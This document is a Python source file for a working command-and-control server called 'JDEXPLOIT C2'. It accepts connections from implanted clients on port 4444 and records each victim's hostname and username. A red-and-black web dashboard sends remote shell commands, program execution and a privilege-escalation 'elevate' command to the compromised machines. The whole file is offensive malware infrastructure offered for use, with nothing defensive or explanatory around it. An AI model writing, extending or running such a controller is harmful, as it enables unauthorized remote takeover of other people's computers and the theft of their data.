#!/usr/bin/env python3
# ============================================================================
# JDEXPLOIT C2 - CORREGIDO - COMANDOS FUNCIONANDO
# ============================================================================

import os
import sys
import json
import time
import socket
import struct
import threading
import hashlib
import datetime
from http import server
from socketserver import ThreadingMixIn
from urllib.parse import urlparse

HOST = '0.0.0.0'
C2_PORT = 4444
WEB_PORT = 8080

class Colors:
    RED = '\033[91m'; WHITE = '\033[97m'; END = '\033[0m'

class Client:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Windows 11"
        self.antivirus = "Defender"
        self.first_seen = datetime.datetime.now()
        self.active = True
        self.privilege = "USER"
    
    def send(self, data):
        try:
            self.conn.send(struct.pack('>I', len(data)) + data.encode())
            return True
        except:
            self.active = False
            return False
    
    def recv(self):
        try:
            raw_len = self.recvall(4)
            if not raw_len: return None
            msglen = struct.unpack('>I', raw_len)[0]
            data = self.recvall(msglen)
            return data.decode() if data else None
        except:
            self.active = False
            return None
    
    def recvall(self, n):
        data = bytearray()
        while len(data) < n:
            packet = self.conn.recv(n - len(data))
            if not packet: return None
            data.extend(packet)
        return bytes(data)
    
    def to_dict(self):
        return {
            'id': self.id,
            'ip': self.addr[0],
            'hostname': self.hostname,
            'username': self.username,
            'os': self.os,
            'antivirus': self.antivirus,
            'privilege': self.privilege,
            'status': 'online' if self.active else 'offline',
            'first_seen': self.first_seen.strftime('%H:%M:%S')
        }

class C2Core:
    def __init__(self):
        self.clients = {}
        self.current_client = None
        self.running = True
    
    def start(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((HOST, C2_PORT))
        self.socket.listen(100)
        print(f"{Colors.RED}[🔥] C2 CORE LISTENING ON {HOST}:{C2_PORT}{Colors.END}")
        threading.Thread(target=self.accept_clients, daemon=True).start()
    
    def accept_clients(self):
        while self.running:
            try:
                conn, addr = self.socket.accept()
                client = Client(conn, addr)
                self.clients[client.id] = client
                print(f"{Colors.RED}[🔥] NEW CLIENT: {client.id} FROM {addr[0]}{Colors.END}")
                client.send("INFO")
                info = client.recv()
                if info:
                    try:
                        data = json.loads(info)
                        client.hostname = data.get('hostname', 'Unknown')
                        client.username = data.get('username', 'Unknown')
                    except: pass
            except Exception as e:
                if self.running:
                    print(f"{Colors.RED}[-] ERROR: {e}{Colors.END}")
    
    def send_command(self, client_id, command):
        if client_id not in self.clients: 
            return "Client not found"
        client = self.clients[client_id]
        if not client.active: 
            return "Client offline"
        
        # 🔴 CORREGIDO: Convertir formato de comando
        if ' ' in command and '|' not in command:
            parts = command.split(' ', 1)
            command = f"{parts[0]}|{parts[1]}"
            print(f"{Colors.RED}[→] Sending: {command}{Colors.END}")
        
        client.send(command)
        response = client.recv()
        return response if response else "No response"

class WebHandler(server.BaseHTTPRequestHandler):
    c2 = None
    
    def do_GET(self):
        path = urlparse(self.path).path
        if path == '/': 
            self.send_html()
        elif path == '/api/clients': 
            self.send_clients()
        else: 
            self.send_error(404)
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        data = json.loads(post_data)
        
        if self.path == '/api/command':
            client_id = data.get('client_id')
            command = data.get('command')
            args = data.get('args', '')
            
            # 🔴 CORREGIDO: Formato correcto para el cliente
            if args:
                full_cmd = f"{command}|{args}"
            else:
                full_cmd = command
            
            print(f"{Colors.RED}[→] Command: {full_cmd}{Colors.END}")
            response = self.c2.send_command(client_id, full_cmd)
            self.send_json({'response': response})
    
    def send_json(self, obj):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(obj).encode())
    
    def send_clients(self):
        clients_list = [client.to_dict() for client in self.c2.clients.values()]
        self.send_json(clients_list)
    
    def send_html(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>JDEXPLOIT C2 - RED/BLACK EDITION</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
                
                body {
                    background: #000000;
                    color: #ffffff;
                    font-family: 'Share Tech Mono', monospace;
                    padding: 30px;
                }
                
                body::before {
                    content: "";
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: repeating-linear-gradient(0deg, rgba(255,0,0,0.03) 0px, rgba(0,0,0,0.9) 2px, rgba(255,0,0,0.03) 3px);
                    pointer-events: none;
                    animation: scan 8s linear infinite;
                }
                
                .container { max-width: 1800px; margin: 0 auto; position: relative; z-index: 10000; }
                
                .header {
                    background: linear-gradient(135deg, #1a0000 0%, #000000 100%);
                    border: 2px solid #ff0000;
                    padding: 30px;
                    margin-bottom: 30px;
                    box-shadow: 0 0 30px rgba(255,0,0,0.3);
                    animation: pulse 2s infinite;
                }
                
                .header h1 {
                    color: #ff0000;
                    font-family: 'Orbitron', sans-serif;
                    font-size: 48px;
                    font-weight: 900;
                    text-transform: uppercase;
                    text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
                    letter-spacing: 8px;
                    animation: flicker 3s infinite;
                }
                
                .badge {
                    background: #ff0000;
                    color: #000000;
                    padding: 8px 20px;
                    display: inline-block;
                    font-family: 'Orbitron', sans-serif;
                    font-weight: bold;
                    font-size: 16px;
                    letter-spacing: 3px;
                    margin-top: 10px;
                    box-shadow: 0 0 20px #ff0000;
                    animation: glitch 2s infinite;
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 25px;
                    margin-top: 30px;
                }
                
                .stat-card {
                    background: #0a0000;
                    border: 1px solid #ff0000;
                    padding: 25px;
                    position: relative;
                    transition: all 0.3s;
                    box-shadow: 0 0 15px rgba(255,0,0,0.2);
                }
                
                .stat-card:hover {
                    transform: translateY(-5px);
                    border-color: #ff3333;
                    box-shadow: 0 0 30px #ff0000;
                }
                
                .stat-card::before {
                    content: "▶";
                    color: #ff0000;
                    position: absolute;
                    top: 10px;
                    left: 10px;
                    font-size: 12px;
                    animation: blink 1s infinite;
                }
                
                @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
                
                .stat-label { color: #ff9999; font-size: 14px; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 10px; }
                .stat-value { color: #ffffff; font-size: 42px; font-weight: bold; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 15px #ff0000; }
                
                .clients-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
                    gap: 25px;
                    margin: 30px 0;
                }
                
                .client-card {
                    background: #080000;
                    border: 1px solid #ff3333;
                    padding: 25px;
                    border-left: 8px solid #ff0000;
                    transition: all 0.3s;
                }
                
                .client-card:hover {
                    background: #0c0000;
                    border-color: #ff6666;
                    box-shadow: 0 0 30px rgba(255,0,0,0.5);
                    transform: scale(1.02);
                }
                
                .client-card.online { border-left-color: #ff0000; }
                .client-card.offline { border-left-color: #660000; opacity: 0.6; }
                
                .client-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 20px;
                    border-bottom: 1px solid #ff0000;
                    padding-bottom: 15px;
                }
                
                .client-id {
                    background: #ff0000;
                    color: #000000;
                    padding: 8px 16px;
                    font-family: 'Orbitron', sans-serif;
                    font-weight: bold;
                    letter-spacing: 2px;
                    box-shadow: 0 0 15px #ff0000;
                }
                
                .status-badge {
                    padding: 6px 16px;
                    font-size: 12px;
                    font-weight: bold;
                    text-transform: uppercase;
                    letter-spacing: 2px;
                }
                
                .status-badge.online {
                    background: #ff0000;
                    color: #000000;
                    box-shadow: 0 0 15px #ff0000;
                }
                
                .status-badge.offline {
                    background: #330000;
                    color: #ff6666;
                }
                
                .client-info {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 15px;
                    margin-bottom: 20px;
                }
                
                .info-item {
                    background: #000000;
                    border: 1px solid #660000;
                    padding: 12px;
                }
                
                .info-label { color: #ff6666; font-size: 10px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
                .info-value { color: #ffffff; font-size: 14px; font-family: 'Courier New', monospace; font-weight: bold; }
                
                .client-actions {
                    display: flex;
                    gap: 10px;
                    margin-top: 15px;
                    flex-wrap: wrap;
                }
                
                .btn {
                    background: transparent;
                    border: 1px solid #ff0000;
                    color: #ff0000;
                    padding: 10px 18px;
                    font-family: 'Share Tech Mono', monospace;
                    font-size: 12px;
                    font-weight: bold;
                    text-transform: uppercase;
                    letter-spacing: 2px;
                    cursor: pointer;
                    transition: all 0.3s;
                    flex: 1;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 8px;
                }
                
                .btn:hover {
                    background: #ff0000;
                    color: #000000;
                    box-shadow: 0 0 20px #ff0000;
                    border-color: #ffffff;
                }
                
                .terminal {
                    background: #050000;
                    border: 2px solid #ff0000;
                    margin-top: 30px;
                    box-shadow: 0 0 30px rgba(255,0,0,0.3);
                }
                
                .terminal-header {
                    background: #1a0000;
                    padding: 15px 20px;
                    border-bottom: 2px solid #ff0000;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }
                
                .terminal-header span {
                    color: #ff0000;
                    font-family: 'Orbitron', sans-serif;
                    font-weight: bold;
                    letter-spacing: 3px;
                }
                
                .terminal-content {
                    background: #000000;
                    padding: 20px;
                    font-family: 'Courier New', monospace;
                    font-size: 14px;
                    height: 350px;
                    overflow-y: auto;
                    color: #ff9999;
                }
                
                .terminal-input {
                    display: flex;
                    padding: 15px;
                    background: #0a0000;
                    border-top: 2px solid #ff0000;
                }
                
                .terminal-input input {
                    flex: 1;
                    background: #000000;
                    border: 1px solid #ff3333;
                    color: #ffffff;
                    padding: 15px;
                    font-family: 'Courier New', monospace;
                    font-size: 14px;
                    margin-right: 10px;
                }
                
                .terminal-input input:focus {
                    outline: none;
                    border-color: #ff0000;
                    box-shadow: 0 0 15px #ff0000;
                }
                
                .footer {
                    margin-top: 50px;
                    padding: 30px;
                    background: #050000;
                    border: 1px solid #ff0000;
                    text-align: center;
                    font-family: 'Orbitron', sans-serif;
                    letter-spacing: 4px;
                }
                
                .footer .autor {
                    color: #ff0000;
                    font-size: 24px;
                    font-weight: 900;
                    text-shadow: 0 0 20px #ff0000;
                    margin-bottom: 10px;
                    animation: pulse 2s infinite;
                }
                
                .footer .copy { color: #ff6666; font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🔴 JDEXPLOIT C2</h1>
                    <div class="badge">⚡ RED/BLACK EDITION v1.0 ⚡</div>
                    
                    <div class="stats">
                        <div class="stat-card">
                            <div class="stat-label">Total Clients</div>
                            <div class="stat-value" id="total-clients">0</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">Online</div>
                            <div class="stat-value" id="online-clients" style="color: #ff0000;">0</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">SYSTEM</div>
                            <div class="stat-value" id="system-clients">0</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">Uptime</div>
                            <div class="stat-value" id="uptime">00:00:00</div>
                        </div>
                    </div>
                </div>
                
                <h2 style="color: #ff0000; font-family: 'Orbitron', sans-serif; margin-bottom: 20px; letter-spacing: 4px;">
                    ⚡ CONNECTED CLIENTS ⚡
                </h2>
                <div id="clients-container" class="clients-grid"></div>
                
                <div class="terminal">
                    <div class="terminal-header">
                        <div>
                            <span>🔥 JDEXPLOIT REMOTE SHELL 🔥</span>
                            <span id="current-client-label" style="color: #ff6666; margin-left: 20px;">(none selected)</span>
                        </div>
                    </div>
                    <div id="terminal-output" class="terminal-content">
                        <span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>
                        <span style="color: #ff6666;">[•] Select a client to begin remote control</span><br><br>
                    </div>
                    <div class="terminal-input">
                        <input type="text" id="terminal-cmd" placeholder=">_ Commands: info, shell whoami, exec calc.exe, elevate" disabled>
                        <button class="btn" onclick="sendTerminalCommand()" id="terminal-send" disabled>EXECUTE</button>
                    </div>
                </div>
                
                <div class="footer">
                    <div class="autor">🔴 JDEXPLOIT 🔴</div>
                    <div class="copy">██████ RED TEAM OPERATOR ██████</div>
                </div>
            </div>
            
            <script>
                let currentClientId = null;
                let clients = {};
                
                setInterval(loadClients, 2000);
                
                function loadClients() {
                    fetch('/api/clients')
                        .then(r => r.json())
                        .then(data => {
                            clients = {};
                            data.forEach(c => clients[c.id] = c);
                            renderClients(data);
                            updateStats();
                        });
                }
                
                function renderClients(clientsList) {
                    const container = document.getElementById('clients-container');
                    container.innerHTML = '';
                    
                    clientsList.forEach(client => {
                        const card = document.createElement('div');
                        card.className = 'client-card ' + client.status;
                        card.innerHTML = `
                            <div class="client-header">
                                <span class="client-id">🔴 ${client.id}</span>
                                <span class="status-badge ${client.status}">${client.status}</span>
                            </div>
                            <div class="client-info">
                                <div class="info-item">
                                    <div class="info-label">HOSTNAME</div>
                                    <div class="info-value">${client.hostname}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">IP</div>
                                    <div class="info-value">${client.ip}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">USER</div>
                                    <div class="info-value">${client.username}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">PRIV</div>
                                    <div class="info-value">${client.privilege}</div>
                                </div>
                            </div>
                            <div class="client-actions">
                                <button class="btn" onclick="selectClient('${client.id}')">SHELL</button>
                                <button class="btn" onclick="sendQuickCommand('${client.id}', 'info')">INFO</button>
                                <button class="btn" onclick="sendQuickCommand('${client.id}', 'elevate')">ELEVATE</button>
                                <button class="btn" onclick="sendQuickCommand('${client.id}', 'exec calc.exe')">CALC</button>
                            </div>
                        `;
                        container.appendChild(card);
                    });
                }
                
                function selectClient(clientId) {
                    currentClientId = clientId;
                    document.getElementById('current-client-label').innerHTML = '(' + clients[clientId].hostname + ')';
                    document.getElementById('terminal-cmd').disabled = false;
                    document.getElementById('terminal-send').disabled = false;
                    addToTerminal('[🔥] Connected to: ' + clients[clientId].hostname, '#ff0000');
                }
                
                function sendQuickCommand(clientId, cmd) {
                    selectClient(clientId);
                    document.getElementById('terminal-cmd').value = cmd;
                    sendTerminalCommand();
                }
                
                function sendTerminalCommand() {
                    const cmd = document.getElementById('terminal-cmd').value;
                    if (!cmd || !currentClientId) return;
                    
                    addToTerminal('> ' + cmd, '#ff9999');
                    document.getElementById('terminal-cmd').value = '';
                    
                    fetch('/api/command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            client_id: currentClientId,
                            command: cmd.split(' ')[0],
                            args: cmd.substring(cmd.indexOf(' ') + 1)
                        })
                    })
                    .then(r => r.json())
                    .then(data => {
                        addToTerminal(data.response, '#cccccc');
                    });
                }
                
                function addToTerminal(text, color) {
                    const output = document.getElementById('terminal-output');
                    const line = document.createElement('div');
                    line.style.color = color;
                    line.style.marginBottom = '5px';
                    line.style.fontFamily = 'Courier New';
                    line.innerHTML = text;
                    output.appendChild(line);
                    output.scrollTop = output.scrollHeight;
                }
                
                function updateStats() {
                    const total = Object.keys(clients).length;
                    document.getElementById('total-clients').innerText = total;
                    document.getElementById('online-clients').innerText = total;
                }
                
                window.startTime = Date.now();
                loadClients();
            </script>
        </body>
        </html>
        """
        self.wfile.write(html.encode())
    
    def log_message(self, format, *args):
        pass

class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
    pass

def main():
    print(f"{Colors.RED}[🔥] JDEXPLOIT C2 - RED/BLACK EDITION{Colors.END}")
    print(f"{Colors.RED}[🔥] C2 Core: {HOST}:{C2_PORT}{Colors.END}")
    print(f"{Colors.RED}[🔥] Web UI: http://{HOST}:{WEB_PORT}{Colors.END}")
    
    c2 = C2Core()
    c2.start()
    
    WebHandler.c2 = c2
    web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
    print(f"{Colors.RED}[🔥] Web dashboard: http://{HOST}:{WEB_PORT}{Colors.END}")
    
    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        c2.running = False
        sys.exit(0)

if __name__ == '__main__':
    main()
